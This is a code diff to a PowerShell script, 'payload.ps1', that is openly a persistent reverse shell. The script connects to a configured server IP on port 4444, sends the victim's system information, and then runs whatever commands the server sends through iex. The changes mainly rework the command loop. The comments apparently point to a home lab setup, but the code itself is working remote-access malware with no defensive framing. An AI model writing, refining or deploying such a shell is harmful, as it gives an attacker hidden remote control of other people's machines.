@@ -1,5 +1,5 @@
 # payload.ps1 - Persistent reverse shell with connection tracking
-$serverIP = "192.168.1.4"  # REPLACE WITH YOUR ARCH IP (10.0.2.2 for VirtualBox NAT)
+$serverIP = "192.168.1.4"  # REPLACE WITH YOUR ARCH IP
 $serverPort = 4444
 $reconnectDelay = 5  # Seconds to wait before reconnecting
 
@@ -18,23 +18,20 @@ function Connect-ToServer {
         $stream = $client.GetStream()
         $writer = New-Object System.IO.StreamWriter($stream)
         $reader = New-Object System.IO.StreamReader($stream)
-        $bytes = New-Object System.Byte[] 1024
-        $encoding = New-Object System.Text.ASCIIEncoding
         
         # Send system info
         $writer.WriteLine((Get-SystemInfo))
         $writer.Flush()
         
-        # Main loop
+        # Main loop: wait for commands from server
         while ($true) {
-            $writer.Write("PS> ")
-            $writer.Flush()
+            # Read command from server
+            $command = $reader.ReadLine()
+            if (-not $command) { break }  # Server closed connection
             
-            $data = $reader.ReadLine()
-            if (-not $data) { break }
-            
-            $command = $data.Trim()
-            if ($command -eq "exit") { break }
+            if ($command -eq "exit") {
+                break
+            }
             
             # Execute command
             $result = iex $command 2>&1 | Out-String
